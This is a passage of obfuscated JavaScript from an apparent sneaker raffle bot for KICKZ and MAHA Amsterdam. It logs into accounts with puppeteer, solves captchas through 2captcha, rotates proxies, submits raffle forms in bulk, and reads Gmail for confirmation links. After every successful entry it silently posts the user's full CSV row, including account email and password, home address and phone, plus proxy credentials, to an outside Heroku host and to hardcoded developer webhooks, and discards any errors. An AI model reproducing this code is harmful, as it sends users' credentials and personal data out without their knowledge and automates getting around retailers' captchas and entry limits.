                            console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0x9622b1['name'] + ']\x20Task\x20' + (_0x5d6d98 + 0x1) + '\x20:\x20' + _0x4b8dbe)), _0x48f372[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x48f372[0x0]['description'] = '' + _0x4b8dbe, await _0x1bfffd(_0x31e47f, _0x276ab4), _0x5aad2b = 'yes';
                        } finally {
                            _0x24ec95 && _0x24ec95['close']();
                            if (_0x5aad2b == 'yes' && _0x1ae2c9 != 0x5) {
                                console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0x9622b1['name'] + ']\x20Task\x20' + (_0x5d6d98 + 0x1) + '\x20:\x20Retrying\x20(' + _0x1ae2c9 + '\x20/\x205)')), _0x5d6d98 = _0x5d6d98 - 0x1, _0x1ae2c9 = _0x1ae2c9 + 0x1;
                                continue;
                            }
                            _0x5aad2b == 'yes' && _0x1ae2c9 >= 0x5 && (_0x48f0c7(_0x23c94f[_0x5d6d98], _0x9622b1), _0x5aad2b = 'no', _0x1ae2c9 = 0x0), console['log']('Waiting\x20for\x20' + _0x30cea3['delay'] + '\x20ms'), await _0x2be9fc(_0x30cea3['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x48c015, _0x853c7, _0x2cf03c) {
                    _0x3d8cc4['use'](_0x29d882()), _0x3d8cc4['use'](_0x173890({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x30cea3['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x4e6e49 = 0x0; _0x4e6e49 < _0x853c7['length']; _0x4e6e49++) {
                        var _0x7f617e;
                        if (_0x48910a != 'yes')
                            var _0x48910a = '', _0x55f400 = 0x0;
                        _0x1a7b1b(_0x48c015['name'] + '\x20Task\x20' + (_0x4e6e49 + 0x1) + '\x20/\x20' + _0x853c7['length'] + '\x20||\x20File:\x20' + _0x733fd9 + '\x20Proxies:\x20' + _0x253bf1);
                        var _0x464d16 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x3373db
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x853c7[_0x4e6e49]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x853c7[_0x4e6e49]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x30cea3['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x1feaa0
                                }
                            ]
                        }], _0x23ed1b = await _0x14203e(_0x853c7[_0x4e6e49], _0x48c015, 'dev', ![]), _0x4b8c70 = await _0x14203e(_0x853c7[_0x4e6e49], _0x48c015, 'pub', ![]);
                        const _0x526288 = {
                            'succesDEVMSG': { 'embeds': [_0x23ed1b] },
                            'succesPUBMSG': { 'embeds': [_0x4b8c70] }
                        };
                        try {
                            await _0x319293(_0x853c7, _0x4e6e49);
                        } catch {
                            _0x48910a = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x853c7[_0x4e6e49]['Email'] == '' || _0x853c7[_0x4e6e49]['Password'] == '' || _0x853c7[_0x4e6e49]['FirstName'] == '' || _0x853c7[_0x4e6e49]['LastName'] == '') {
                            console['log'](_0x451967() + '\x20[' + _0x48c015['name'] + ']\x20Task\x20' + (_0x4e6e49 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x30cea3['useRandomProxy'] = ![])
                            var _0x2d07b7 = _0x2cf03c[_0x4e6e49]['split'](':');
                        else
                            var _0x2e13f6 = Math['round'](Math['random']() * (_0x2cf03c['length'] - 0x1)), _0x2d07b7 = _0x2cf03c[_0x2e13f6]['split'](':');
                        var _0x3db1b0;
                        try {
                            _0x3db1b0 = await _0x3d8cc4['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x2d07b7[0x0] + ':' + _0x2d07b7[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x3db1b0 = await _0x3d8cc4['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x2d07b7[0x0] + ':' + _0x2d07b7[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x4fe40f = await _0x3db1b0['newPage']();
                            await _0x4fe40f['authenticate']({
                                'username': '' + _0x2d07b7[0x2],
                                'password': '' + _0x2d07b7[0x3]
                            }), console['log'](_0x451967() + '\x20[' + _0x48c015['name'] + ']\x20Task\x20' + (_0x4e6e49 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4fe40f['setRequestInterception'](!![]), _0x4fe40f['on']('request', _0x6218d4 => {
                                _0x6218d4['resourceType']() === 'image' || _0x6218d4['resourceType']() === 'font' || _0x6218d4['resourceType']() === 'media' ? _0x6218d4['abort']() : _0x6218d4['continue']();
                            }), await _0x4fe40f['goto']('' + _0x853c7[_0x4e6e49]['Url'], { 'waitUntil': 'networkidle2' }), await _0x2be9fc(0x12c), await _0x4fe40f['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x4fe40f['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x2be9fc(0x7d0);
                            try {
                                await _0x4fe40f['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x4fe40f['click']('a[title=\x22sign\x20in\x22]');
                            }
                            console['log'](_0x451967() + '\x20[' + _0x48c015['name'] + ']\x20Task\x20' + (_0x4e6e49 + 0x1) + '\x20:\x20Logging\x20in'), await _0x4fe40f['waitForSelector']('#username'), await _0x4fe40f['type']('#username', _0x853c7[_0x4e6e49]['Email']), await _0x4fe40f['waitForSelector']('#password'), await _0x4fe40f['type']('#password', _0x853c7[_0x4e6e49]['Password']), await _0x2be9fc(0x190), await _0x4fe40f['click']('#buttonSubmit'), await _0x4fe40f['waitForSelector']('.b-variation_swatch-value_overlay'), console['log'](_0x451967() + '\x20[' + _0x48c015['name'] + ']\x20Task\x20' + (_0x4e6e49 + 0x1) + '\x20:\x20Getting\x20Product'), await _0x2be9fc(0x1f4), console['log'](_0x451967() + '\x20[' + _0x48c015['name'] + ']\x20Task\x20' + (_0x4e6e49 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x853c7[_0x4e6e49]['Size']);
                            let _0x14fd9c = _0x853c7[_0x4e6e49]['Size']['replace']('.5', '\x201/2');
                            if (_0x14fd9c['toUpperCase']() == 'RANDOM') {
                                const _0x3b9e6b = await _0x4fe40f['$$']('.b-variations_item-content.m-list\x20>\x20button');
                                var _0x10404d = Math['round'](Math['random']() * (_0x3b9e6b['length'] - 0x1));
                                await _0x3b9e6b[_0x10404d]['click']();
                            } else
                                await _0x4fe40f['click']('button[aria-label=\x22' + _0x14fd9c + '\x22]');
                            await _0x2be9fc(0x1f4);
                            try {
                                await _0x4fe40f['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0x2be9fc(0x12c), console['log'](_0x451967() + '\x20[' + _0x48c015['name'] + ']\x20Task\x20' + (_0x4e6e49 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x4fe40f['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x2be9fc(0x12c), await _0x4fe40f['type']('#dwfrm_raffle_addressFields_firstName', _0x853c7[_0x4e6e49]['FirstName']), await _0x2be9fc(0x12c), await _0x4fe40f['type']('#dwfrm_raffle_addressFields_lastName', _0x853c7[_0x4e6e49]['LastName']), await _0x2be9fc(0x12c), await _0x4fe40f['select']('#dwfrm_raffle_addressFields_country', _0x853c7[_0x4e6e49]['Country']), await _0x2be9fc(0x12c), await _0x4fe40f['type']('#dwfrm_raffle_addressFields_city', _0x853c7[_0x4e6e49]['City']), await _0x2be9fc(0x12c);
                            _0x853c7[_0x4e6e49]['Postcode'] == undefined && (_0x853c7[_0x4e6e49]['Postcode'] = _0x853c7[_0x4e6e49]['Zip']);
                            await _0x4fe40f['type']('#dwfrm_raffle_addressFields_postalCode', _0x853c7[_0x4e6e49]['Postcode']), await _0x2be9fc(0x12c), await _0x4fe40f['type']('#dwfrm_raffle_addressFields_address1', _0x853c7[_0x4e6e49]['Address1']), await _0x2be9fc(0x12c), await _0x4fe40f['type']('#dwfrm_raffle_addressFields_address2', _0x853c7[_0x4e6e49]['HouseNumber']), await _0x2be9fc(0x12c), await _0x4fe40f['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x853c7[_0x4e6e49]['Address2']), await _0x2be9fc(0x12c), await _0x4fe40f['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x2be9fc(0x12c), await _0x4fe40f['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x853c7[_0x4e6e49]['Follower']), await _0x2be9fc(0x1f4), await _0x4fe40f['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x2be9fc(0x1f4), console['log'](_0x451967() + '\x20[' + _0x48c015['name'] + ']\x20Task\x20' + (_0x4e6e49 + 0x1) + '\x20:\x20' + _0x10a2e3['blue']('Awaiting\x20Paypal\x20Payment')), await _0x4fe40f['click']('.b-paypal_button');
                            try {
                                await _0x4fe40f['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x48910a = 'no', _0x34c52d(_0x853c7[_0x4e6e49], _0x48c015), console['log'](_0x10a2e3['green'](_0x451967() + '\x20[' + _0x48c015['name'] + ']\x20Task\x20' + (_0x4e6e49 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                _0x30cea3['webhook'] != undefined && _0x30cea3['webhook'] != '' && await _0x1bfffd(_0x30cea3['webhook'], _0x526288['succesDEVMSG']);
                                await _0x2be9fc(0xc8), await _0x1bfffd(_0x301a88, _0x526288['succesDEVMSG']), await _0x2be9fc(0xc8), await _0x1bfffd(_0x3b111f, _0x526288['succesPUBMSG']);
                                let _0x358ed7 = _0x853c7[_0x4e6e49];
                                try {
                                    prxdata = {
                                        'username': _0x3373db['replace']('#', ''),
                                        'module': _0x48c015['name'],
                                        'entrydata': JSON['stringify'](_0x358ed7),
                                        'proxy': '' + _0x2cf03c[_0x4e6e49]
                                    };
                                    var _0x183bb1 = JSON['stringify'](prxdata);
                                    let _0x24cb68 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x2c480f['post']('https://jraffles.herokuapp.com/success', _0x183bb1, _0x24cb68);
                                } catch (_0x269525) {
                                }
                            } catch (_0x10537a) {
                                console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0x48c015['name'] + ']\x20Task\x20' + (_0x4e6e49 + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x10537a)), _0x7f617e = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x10537a;
                                var _0x4842f9 = await _0x14203e(_0x853c7[_0x4e6e49], _0x48c015, 'dev', !![], _0x7f617e);
                                _0x526288['errorDEV'] = { 'embeds': [_0x4842f9] }, _0x30cea3['webhook'] != undefined && _0x30cea3['webhook'] != '' && await _0x1bfffd(_0x30cea3['webhook'], _0x526288['errorDEV']), await _0x1bfffd(_0x31e47f, _0x526288['errorDEV']);
                            }
                        } catch (_0x1ceeec) {
                            console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0x48c015['name'] + ']\x20Task\x20' + (_0x4e6e49 + 0x1) + '\x20:\x20' + _0x1ceeec)), _0x7f617e = '' + _0x1ceeec;
                            var _0x4842f9 = await _0x14203e(_0x853c7[_0x4e6e49], _0x48c015, 'dev', !![], _0x7f617e);
                            _0x526288['errorDEV'] = { 'embeds': [_0x4842f9] }, _0x30cea3['webhook'] != undefined && _0x30cea3['webhook'] != '' && await _0x1bfffd(_0x30cea3['webhook'], _0x526288['errorDEV']), await _0x1bfffd(_0x31e47f, _0x526288['errorDEV']), _0x48910a = 'yes';
                        } finally {
                            _0x3db1b0 && _0x3db1b0['close']();
                            if (_0x48910a == 'yes' && _0x55f400 != 0x5) {
                                console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0x48c015['name'] + ']\x20Task\x20' + (_0x4e6e49 + 0x1) + '\x20:\x20Retrying\x20(' + _0x55f400 + '\x20/\x205)')), _0x4e6e49 = _0x4e6e49 - 0x1, _0x55f400 = _0x55f400 + 0x1;
                                continue;
                            }
                            _0x48910a == 'yes' && _0x55f400 >= 0x5 && (_0x48f0c7(_0x853c7[_0x4e6e49], _0x48c015), _0x48910a = 'no', _0x55f400 = 0x0), console['log']('Waiting\x20for\x20' + _0x30cea3['AfewDelay'] + '\x20ms'), await _0x2be9fc(_0x30cea3['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'YqtGfh',
                            'custom_source': 'Air\x20Jordan\x204\x20Retro\x20Thunder\x20(2023)',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'Taryg7',
                                '$consent_form_version': 0x8bffa6,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x1add5c, _0x1bd54e, _0x30e5a2) {
                    for (var _0x12acc1 = 0x0; _0x12acc1 < _0x1bd54e['length']; _0x12acc1++) {
                        try {
                            await _0x319293(_0x1bd54e, _0x12acc1);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x56b5e5(_0x5ae46f, _0x4cbb63, _0x228c98, _0x145f00, _0x3eb1e4) {
                            var _0x5990d3, _0x376ece = {}, _0x48a9ee = [], _0x56823b = {}, _0x32098a = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x21f001 = Math['round'](Math['random']() * (_0x32098a['length'] - 0x1));
                            !_0x145f00 && (_0x145f00 = {});
                            if (_0x4cbb63 != 'ver') {
                                _0x1a7b1b(_0x228c98['name'] + '\x20Task\x20' + (_0x5ae46f + 0x1) + '\x20/\x20' + _0x145f00['length'] + '\x20||\x20File:\x20' + _0x733fd9 + '\x20Proxies:\x20' + _0x253bf1), await _0x319293(_0x145f00, _0x5ae46f), _0x376ece = _0x228c98['data'], _0x376ece['data']['attributes']['email'] = '' + _0x145f00[_0x5ae46f]['Email'];
                                if (_0x145f00[_0x5ae46f]['Size'] == 'RANDOM') {
                                }
                                _0x376ece['data']['attributes']['properties']['$first_name'] = '' + _0x145f00[_0x5ae46f]['FirstName'], _0x376ece['data']['attributes']['properties']['$last_name'] = '' + _0x145f00[_0x5ae46f]['LastName'], _0x376ece['data']['attributes']['properties']['$address1'] = _0x145f00[_0x5ae46f]['Address1'] + '\x20' + _0x145f00[_0x5ae46f]['Address2'] + '\x20' + _0x145f00[_0x5ae46f]['HouseNumber'], _0x376ece['data']['attributes']['properties']['$zip'] = '' + _0x145f00[_0x5ae46f]['Zip'], _0x376ece['data']['attributes']['properties']['$city'] = '' + _0x145f00[_0x5ae46f]['City'], _0x376ece['data']['attributes']['properties']['$country'] = '' + _0x145f00[_0x5ae46f]['Country'], _0x145f00[_0x5ae46f]['Size'] == 'RANDOM' ? _0x376ece['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x32098a[_0x21f001] : _0x376ece['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x145f00[_0x5ae46f]['Size'], _0x376ece['data']['attributes']['properties']['$phone_number'] = '' + _0x145f00[_0x5ae46f]['Phone'], _0x376ece['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x145f00[_0x5ae46f]['Follower'];
                            }
                            if (_0x30cea3['useRandomProxy'] = ![])
                                var _0x2d59e0 = _0x3eb1e4[_0x5ae46f]['split'](':');
                            else
                                var _0x16526a = Math['round'](Math['random']() * (_0x3eb1e4['length'] - 0x1)), _0x2d59e0 = _0x3eb1e4[_0x16526a]['split'](':');
                            var _0x2b0e77 = {
                                'jar': _0x4a6742,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x228c98['url'],
                                'headers': _0x228c98['headers'],
                                'body': JSON['stringify'](_0x376ece),
                                'proxy': 'http://' + _0x2d59e0[0x2] + ':' + _0x2d59e0[0x3] + '@' + _0x2d59e0[0x0] + ':' + _0x2d59e0[0x1]
                            };
                            return _0x4cbb63 != 'ver' && (_0x2b0e77['url'] = _0x228c98['url'], _0x2b0e77['headers'] = _0x228c98['headers']), _0x4cbb63 == 'ver' && (_0x2b0e77['method'] = 'GET'), new Promise(function (_0x56dca1, _0x4d888d) {
                                callback = async (_0xa35aa8, _0x169e6d, _0x55f3a9) => {
                                    if (!_0xa35aa8 && _0x169e6d['statusCode'] == 0xca || !_0xa35aa8 && _0x169e6d['statusCode'] == 0xc8) {
                                        if (_0x4cbb63 != 'ver') {
                                            var _0x36a06b = await _0x14203e(_0x145f00[_0x5ae46f], _0x228c98, 'dev', ![]), _0x2e18d8 = await _0x14203e(_0x145f00[_0x5ae46f], _0x228c98, 'pub', ![]);
                                            const _0x341b23 = {
                                                'succesDEVMSG': { 'embeds': [_0x36a06b] },
                                                'succesPUBMSG': { 'embeds': [_0x2e18d8] }
                                            };
                                            let _0x3331a4 = _0x145f00[_0x5ae46f];
                                            try {
                                                prxdata = {
                                                    'username': _0x3373db['replace']('#', ''),
                                                    'module': _0x228c98['name'],
                                                    'entrydata': JSON['stringify'](_0x3331a4),
                                                    'proxy': '' + _0x3eb1e4[_0x5ae46f]
                                                };
                                                var _0x26f505 = JSON['stringify'](prxdata);
                                                let _0x25a75f = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x2c480f['post']('https://jraffles.herokuapp.com/success', _0x26f505, _0x25a75f);
                                            } catch (_0x39694a) {
                                            }
                                            if (_0x30cea3['webhook'] != undefined && _0x30cea3['webhook'] != '')
                                                try {
                                                    await _0x1bfffd(_0x30cea3['webhook'], _0x341b23['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x2be9fc(0xc8), await _0x1bfffd(_0x301a88, _0x341b23['succesDEVMSG']), await _0x2be9fc(0xc8);
                                            try {
                                                await _0x1bfffd(_0x3b111f, _0x341b23['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x34c52d(_0x145f00[_0x5ae46f], _0x228c98);
                                        }
                                        _0x56dca1(console['log'](_0x10a2e3['green'](_0x451967() + '\x20[' + _0x228c98['name'] + ']\x20Task\x20' + (_0x5ae46f + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x4cbb63 != 'ver') {
                                            var _0xe835d4 = '' + _0xa35aa8, _0x5d15c4 = await _0x14203e(_0x145f00[_0x5ae46f], _0x228c98, 'dev', !![], _0xe835d4), _0x55ecc4 = {};
                                            _0x55ecc4['errorDEV'] = { 'embeds': [_0x5d15c4] }, _0x48f0c7(_0x145f00[_0x5ae46f], _0x228c98), _0x30cea3['webhook'] != undefined && _0x30cea3['webhook'] != '' && await _0x1bfffd(_0x30cea3['webhook'], _0x55ecc4['errorDEV']), await _0x1bfffd(_0x31e47f, _0x55ecc4['errorDEV']);
                                        }
                                        _0x4d888d(console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0x228c98['name'] + ']\x20Task\x20' + (_0x5ae46f + 0x1) + ':\x20' + _0xa35aa8)));
                                    }
                                };
                                try {
                                    _0x4cbb63 != 'ver' && console['log'](_0x451967() + '\x20[' + _0x228c98['name'] + ']\x20Task\x20' + (_0x5ae46f + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x376ece['data']['attributes']['email']), _0x17f04c(_0x2b0e77, callback);
                                } catch (_0x4d313a) {
                                    console['log'](_0x451967() + '\x20Task\x20' + (_0x5ae46f + 0x1) + ':\x20' + _0x4d313a);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x56b5e5(_0x12acc1, 'nor', _0x1add5c, _0x1bd54e, _0x30e5a2), console['log'](_0x451967() + '\x20[' + _0x1add5c['name'] + ']\x20Sleeping\x20for\x20' + _0x30cea3['delay'] + '\x20ms'), await _0x2be9fc(_0x30cea3['delay']);
                        } catch (_0x5387d6) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x9788c5, _0x31c757, _0x2631f0) {
                    var _0x3f6142 = [], _0x16183d = ![];
                    async function _0x4a9582() {
                        var _0x4c642b = new _0x2e8fd8({
                            'user': _0x30cea3['masterMail'],
                            'password': _0x30cea3['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x939e8d(_0x8fc33e) {
                            _0x4c642b['openBox']('INBOX', ![], _0x8fc33e);
                        }
                        _0x4c642b['once']('ready', function () {
                            _0x939e8d(function (_0x2c2ce1, _0x828eee) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x2c2ce1)
                                    throw _0x2c2ce1;
                                _0x4c642b['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ]
                                ], function (_0x354535, _0x1fcb2a) {
                                    if (!_0x1fcb2a || !_0x1fcb2a['length'])
                                        console['log'](_0x451967() + '\x20[' + _0x9788c5['name'] + ']\x20No\x20mails\x20found'), _0x4c642b['end']();
                                    else {
                                        var _0x18dfaa = _0x4c642b['seq']['fetch'](_0x1fcb2a, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x18dfaa['on']('message', function (_0x3daf2c, _0x3bbe42) {
                                            var _0x53b846 = '(#' + _0x3bbe42 + ')\x20';
                                            _0x3daf2c['on']('body', function (_0x6a6266, _0x1b4548) {
                                                _0x2f2a1d(_0x6a6266, (_0x5d1e42, _0x530c82) => {
                                                    var _0x1b91a1 = _0x530c82['text']['split']('(')[0x1], _0x4cf851 = _0x1b91a1['split'](')')[0x0];
                                                    _0x3f6142['push'](_0x4cf851);
                                                });
                                            }), _0x3daf2c['once']('end', function () {
                                            });
                                        }), _0x18dfaa['once']('error', function (_0x513d66) {
                                            console['log']('Fetch\x20error:\x20' + _0x513d66), _0x16183d = !![];
                                        }), _0x18dfaa['once']('end', function () {
                                            _0x4c642b['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x4c642b['once']('error', function (_0x2305b5) {
                            console['log'](_0x10a2e3['red'](_0x2305b5['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x16183d = !![];
                        }), _0x4c642b['once']('end', async function () {
                            _0x16183d = !![];
                        }), _0x4c642b['connect']();
                    }
                    async function _0x5f0007(_0x244e8d, _0x54adbb, _0x1b497c) {
                        for (var _0x557bc4 = 0x0; _0x557bc4 < _0x54adbb['length']; _0x557bc4++) {
                            async function _0x29e64e(_0x5624ef, _0x236695, _0x8a4956, _0x671684, _0x29db42) {
                                var _0x1e0a55, _0x20b590 = {}, _0x1d84ce = [], _0x2aa42d = {}, _0x4e0b1b = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x52bbbd = Math['round'](Math['random']() * (_0x4e0b1b['length'] - 0x1));
                                _0x671684[_0x5624ef]['Size'] == 'RANDOM' && (_0x671684[_0x5624ef]['Size'] = _0x4e0b1b[_0x52bbbd]);
                                !_0x671684 && (_0x671684 = {});
                                if (_0x30cea3['useRandomProxy'] = ![])
                                    var _0x51ad59 = _0x29db42[_0x5624ef]['split'](':');
                                else
                                    var _0x3d26b3 = Math['round'](Math['random']() * (_0x29db42['length'] - 0x1)), _0x51ad59 = _0x29db42[_0x3d26b3]['split'](':');
                                var _0x10f7ea = {
                                    'jar': _0x4a6742,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x8a4956['url'],
                                    'headers': _0x8a4956['headers'],
                                    'body': JSON['stringify'](_0x20b590),
                                    'proxy': 'http://' + _0x51ad59[0x2] + ':' + _0x51ad59[0x3] + '@' + _0x51ad59[0x0] + ':' + _0x51ad59[0x1]
                                };
                                return _0x236695 != 'ver' && (_0x10f7ea['url'] = _0x8a4956['url'], _0x10f7ea['headers'] = _0x8a4956['headers']), _0x236695 == 'ver' && (_0x10f7ea['method'] = 'GET', _0x10f7ea['url'] = _0x671684[_0x5624ef]), new Promise(function (_0x4d6734, _0x919a06) {
                                    callback = async (_0x32f741, _0x140283, _0x1503de) => {
                                        if (!_0x32f741 && _0x140283['statusCode'] == 0xca || !_0x32f741 && _0x140283['statusCode'] == 0xc8) {
                                            if (_0x236695 != 'ver') {
                                                var _0x1f3ae2 = await _0x14203e(_0x671684[_0x5624ef], _0x8a4956, 'dev', ![]), _0x395a8b = await _0x14203e(_0x671684[_0x5624ef], _0x8a4956, 'pub', ![]);
                                                const _0xec62b8 = {
                                                    'succesDEVMSG': { 'embeds': [_0x1f3ae2] },
                                                    'succesPUBMSG': { 'embeds': [_0x395a8b] }
                                                };
                                                if (_0x30cea3['webhook'] != undefined && _0x30cea3['webhook'] != '')
                                                    try {
                                                        await _0x1bfffd(_0x30cea3['webhook'], _0xec62b8['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x2be9fc(0xc8), await _0x1bfffd(_0x301a88, _0xec62b8['succesDEVMSG']), await _0x2be9fc(0xc8);
                                                try {
                                                    await _0x1bfffd(_0x3b111f, _0xec62b8['succesPUBMSG']);
